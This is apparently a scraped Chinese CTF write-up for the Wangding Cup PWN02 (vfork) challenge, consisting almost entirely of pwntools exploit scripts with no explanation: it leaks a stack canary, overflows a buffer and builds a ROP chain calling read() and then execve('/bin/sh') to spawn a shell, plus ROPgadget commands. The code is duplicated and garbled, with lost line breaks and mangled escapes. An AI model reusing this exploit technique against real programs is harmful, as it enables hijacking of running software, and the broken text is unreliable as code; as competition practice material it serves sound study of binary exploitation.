# web选手入门pwn(22) ——网鼎杯PWN02(vfork)

> 原文: https://www.ctfiot.com/214123.html
> ID: 214123

set follow-fork-mode childset detach-on-fork off

gdb ./pwnset follow-fork-mode childset detach-on-fork offb *0x401A30b *0x401995r

info inferiorsinferior 1

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n c")#sh = process("./pwn")
sh.sendafter("leave your name","A"*64)sh.sendafter("Wanna return?","B")
sh.interactive()

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)sh.sendafter("once again?","D"*256)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8 + "E"*8sh.sendafter("once again?",payload)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()

ROPgadget --binary ./pwn --only "pop|ret" | grep raxROPgadget --binary ./pwn --opcode 0F05C3

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
#sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)
pop_rax = 0x0000000000450277pop_rdi = 0x000000000040213fpop_rsi = 0x000000000040a1aepop_rdx_rbx = 0x0000000000485febsyscall = 0x000000000041ac26ret = 0x41ac28bss = 0x4CB800
payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8#read(0,bss,0x100)payload+= p64(pop_rax) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_rbx) + p64(0x100) + p64(0x100) + p64(syscall)payload+= p64(ret)#execve('/bin/sh',0,0)payload+= p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx_rbx) + p64(0x0) + p64(0x0) + p64(syscall)sh.sendafter("once again?",payload)sh.send("/bin/sh")
sh.interactive()


```
set follow-fork-mode childset detach-on-fork off
gdb ./pwnset follow-fork-mode childset detach-on-fork offb *0x401A30b *0x401995r
info inferiorsinferior 1
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n c")#sh = process("./pwn")
sh.sendafter("leave your name","A"*64)sh.sendafter("Wanna return?","B")
sh.interactive()
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)sh.sendafter("once again?","D"*256)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8 + "E"*8sh.sendafter("once again?",payload)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()
ROPgadget --binary ./pwn --only "pop|ret" | grep raxROPgadget --binary ./pwn --opcode 0F05C3
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
    #sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)
pop_rax = 0x0000000000450277pop_rdi = 0x000000000040213fpop_rsi = 0x000000000040a1aepop_rdx_rbx = 0x0000000000485febsyscall = 0x000000000041ac26ret = 0x41ac28bss = 0x4CB800
payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8#read(0,bss,0x100)payload+= p64(pop_rax) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_rbx) + p64(0x100) + p64(0x100) + p64(syscall)payload+= p64(ret)#execve('/bin/sh',0,0)payload+= p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx_rbx) + p64(0x0) + p64(0x0) + p64(syscall)sh.sendafter("once again?",payload)sh.send("/bin/sh")
sh.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1730958080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1730958080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730958081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730958081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1730958081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1730958081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730958082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1730958082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730958082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730958083.png)